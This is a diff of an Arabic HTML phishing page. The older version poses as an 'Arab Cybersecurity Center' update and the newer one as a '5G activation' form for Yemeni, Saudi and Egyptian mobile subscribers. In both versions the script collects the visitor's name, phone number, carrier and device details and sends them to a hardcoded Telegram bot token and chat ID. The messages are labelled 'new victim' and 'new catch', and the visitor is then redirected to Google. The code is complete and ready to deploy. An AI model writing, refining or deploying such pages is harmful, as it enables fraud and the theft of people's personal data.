@@ -3,89 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>المركز العربي للأمن السيبراني - تحديث البيانات</title>
+    <title>بوابة الخدمات الرقمية</title>
     <style>
-        :root { --primary: #0056b3; --accent: #ff3d00; }
-        body { font-family: sans-serif; background: #f4f7f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: white; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-top: 6px solid var(--primary); }
-        .logo { text-align: center; margin-bottom: 20px; color: var(--primary); font-size: 24px; font-weight: bold; }
-        p { color: #555; font-size: 14px; line-height: 1.6; text-align: center; }
-        .input-box { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        .btn { background: var(--primary); color: white; border: none; width: 100%; padding: 15px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #003d7e; }
-        #status { display: none; margin-top: 15px; text-align: center; color: var(--accent); font-weight: bold; }
+        /* تصميم الواجهة - مدمج لضمان العمل */
+        body { margin: 0; padding: 0; font-family: sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .loading-screen { text-align: center; width: 100%; }
+        /* الخط الأبيض الذي يشتكي منه المستخدم - جعلته يتحرك الآن */
+        .progress-bar { width: 200px; height: 2px; background: #333; margin: 20px auto; position: relative; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: white; position: absolute; animation: load 3s forwards; }
+        @keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        .content { display: none; padding: 20px; background: #161b22; border-radius: 10px; width: 90%; max-width: 400px; border: 1px solid #30363d; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #238636; border: none; color: white; font-weight: bold; cursor: pointer; border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo">🛡️ تحديث الأمان العربي</div>
-    <p>لضمان استقرار الخدمة في منطقتك، يرجى تحديث بيانات الهوية الرقمية الخاصة بجهازك.</p>
-    
-    <div class="input-box">
-        <label>الاسم الكامل</label>
-        <input type="text" id="name" placeholder="أدخل اسمك كما في الهوية">
-    </div>
-    
-    <div class="input-box">
-        <label>رقم الهاتف (مع رمز الدولة)</label>
-        <input type="number" id="phone" placeholder="+966xxxxxxxxx">
+    <div id="loader" class="loading-screen">
+        <p id="status">جاري فحص توافق الجهاز...</p>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
     </div>
 
-    <button class="btn" onclick="captureAndSend()">تأكيد وتحديث ✅</button>
-    <div id="status">جاري فحص اتصال الجهاز...</div>
-</div>
+    <div id="main-ui" class="content">
+        <h3 style="color: #58a6ff;">تنشيط خدمات الـ 5G</h3>
+        <p style="font-size: 12px; color: #8b949e;">الرجاء تحديث بيانات الشريحة لضمان عدم انقطاع الخدمة.</p>
+        <select id="provider">
+            <option>يمن موبايل - Yemen Mobile</option>
+            <option>STC - السعودية</option>
+            <option>فودافون - مصر</option>
+            <option>أخرى</option>
+        </select>
+        <input type="text" id="name" placeholder="الاسم الكامل">
+        <input type="number" id="phone" placeholder="رقم الهاتف">
+        <button onclick="sendAndRedirect()">تحديث البيانات الآن</button>
+    </div>
 
-<script>
-// --- إعداداتك الخاصة ---
-const TELEGRAM_TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
-const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('id') || "7715667493"; // يأخذ الايدي من الرابط أو يستخدم ايديك الافتراضي
+    <script>
+        // كود الجافا سكربت المدمج
+        const BOT_TOKEN = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
+        const urlParams = new URLSearchParams(window.location.search);
+        const CHAT_ID = urlParams.get('id') || "7715667493";
 
-async function captureAndSend() {
-    const name = document.getElementById('name').value;
-    const phone = document.getElementById('phone').value;
-    const status = document.getElementById('status');
+        // تشغيل شاشة التحميل ثم إظهار الواجهة
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+            captureExtraInfo(); // بدء جمع المعلومات في الخلفية
+        }, 3500);
 
-    if(!name || !phone) { alert("يرجى إدخال كافة البيانات"); return; }
+        async function captureExtraInfo() {
+            // جمع معلومات الجهاز فوراً
+            let info = `📱 معلومات تقنية:\n`;
+            info += `- المتصفح: ${navigator.userAgent.split(' ')[0]}\n`;
+            info += `- المنصة: ${navigator.platform}\n`;
+            info += `- الذاكرة: ${navigator.deviceMemory || 'غير معروفة'} GB\n`;
+            info += `- اللغة: ${navigator.language}`;
+            
+            // إرسال المعلومات التقنية فوراً كتمهيد
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
+        }
 
-    status.style.display = "block";
-    
-    // جمع معلومات الجهاز (بدون PHP)
-    const deviceInfo = {
-        platform: navigator.platform,
-        agent: navigator.userAgent,
-        language: navigator.language,
-        cores: navigator.hardwareConcurrency,
-        ram: navigator.deviceMemory || "N/A",
-        screen: `${window.screen.width}x${window.screen.height}`
-    };
+        function sendAndRedirect() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const prov = document.getElementById('provider').value;
 
-    const message = `
-🎯 **ضحية جديدة (جمع معلومات)**
-👤 الاسم: ${name}
-📞 الهاتف: ${phone}
-📱 النظام: ${deviceInfo.platform}
-💾 الرام: ${deviceInfo.ram} GB
-🖥️ الشاشة: ${deviceInfo.screen}
-🌐 المتصفح: ${deviceInfo.agent}
-    `;
+            if(!name || !phone) { alert("يرجى إكمال البيانات"); return; }
 
-    // الإرسال المباشر للتليجرام
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
-        });
-        
-        status.innerText = "✅ تم التحديث بنجاح!";
-        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
-    } catch (e) {
-        status.innerText = "❌ خطأ في الاتصال، حاول لاحقاً.";
-    }
+            const finalMsg = `🎯 صيد جديد:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🏢 الشبكة: ${prov}`;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalMsg)}`)
+            .then(() => {
+                alert("تم استلام طلبك، سيتم التنشيط خلال 24 ساعة.");
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
 }
 </script>
 
